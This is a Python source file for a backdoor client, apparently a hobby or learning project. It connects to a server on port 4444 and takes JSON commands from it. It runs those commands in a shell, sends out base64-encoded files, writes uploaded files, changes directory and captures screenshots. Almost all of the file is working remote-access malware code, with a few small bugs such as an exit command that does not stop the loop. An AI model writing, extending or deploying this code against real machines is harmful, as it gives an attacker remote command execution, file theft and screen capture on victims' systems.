import socket
import json
import subprocess
import os
import base64
from PIL import ImageGrab



class BackdoorClient:
    def __init__(self, server_host, server_port):
        # starts client and sets variables
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((server_host, server_port))

        self.server_host = server_host
        self.server_port = server_port

        print(f"Connected to {self.server_host}:{self.server_port}")

    def json_send(self, data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)
    
    def json_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_command(self, command):
        return subprocess.check_output(command, shell=True).decode('utf-8')
    
    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                file_content = base64.b64encode(file.read()).decode('utf-8')
                return file_content
        except Exception as e:
            print(f"client read_file brokie: {str(e)}")
            return None

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "[Upload Sucessful]"
        except Exception as e:
            print(f"client write_file brokie: {str(e)}")
            return None

    def cd_to(self, path):
        os.chdir(path)
        return f"[Changing current directory to {path}]"
    
    def take_screenshot(self,filename):
        try:
            image = ImageGrab.grab()
            image.save(filename, "JPEG")
            return "[Screenshot Sucessful]"
        except Exception as e:
            return (f"[Screenshot failed: {str(e)}]")
            
    def run(self):
        while True:
            try:
                command = self.json_recieve()
                

                if command[0] == "exit":
                    self.connection.close()
                    #exit()

                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.cd_to(command[1])

                elif command[0] == "download":
                    command_output = self.read_file(command[1])

                elif command[0] == "upload":
                    command_output = self.write_file(command[1], command[2])

                elif command[0] == "screenshot":
                    self.take_screenshot(command[1])

                else:
                    command_output = self.execute_command(command)



                self.json_send(command_output)

            except Exception as e:
                print(f"run failed: {str(e)}")
                continue 



server_host = "localhost" # 192.168.0.81
server_port = 4444

client = BackdoorClient(server_host, server_port)
client.run()